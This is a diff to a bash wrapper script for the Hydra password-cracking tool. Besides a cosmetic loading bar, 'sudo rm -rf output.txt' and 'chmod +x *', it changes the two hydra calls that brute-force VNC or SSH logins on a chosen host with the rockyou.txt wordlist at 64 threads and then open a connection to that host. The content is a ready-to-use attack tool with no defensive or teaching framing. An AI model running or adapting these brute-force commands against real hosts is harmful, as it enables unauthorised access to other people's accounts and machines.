@@ -1,6 +1,20 @@
 #!/bin/bash
-chmod +x hydra.sh
-rm -rf output.txt
+sudo rm -rf output.txt
+clear
+echo "Loading..."
+for ((k = 0; k <= 10 ; k++))
+do
+    echo -n "[ "
+    for ((i = 0 ; i <= k; i++)); do echo -n "###"; done
+    sleep 1
+    for ((j = i ; j <= 10 ; j++)); do echo -n "   "; done
+    v=$((k * 10))
+    echo -n " ] "
+    echo -n "$v%" $'\r'
+done
+echo
+chmod +x *
+
 clear
 echo 'Starting...'
 
@@ -29,10 +43,10 @@ function run() {
 	if [ $user == "NONE" ] 
 		
 		then
-			hydra -P rockyou.txt -t 64 -o output.txt -I vnc://$host
+			hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://$host
 			open vnc://$host
 		else
-			hydra -l $user -P rockyou.txt -t 64 -o output.txt -I ssh://$host
+			hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I ssh://$host
 			open ssh $user@$host
 	fi
 };
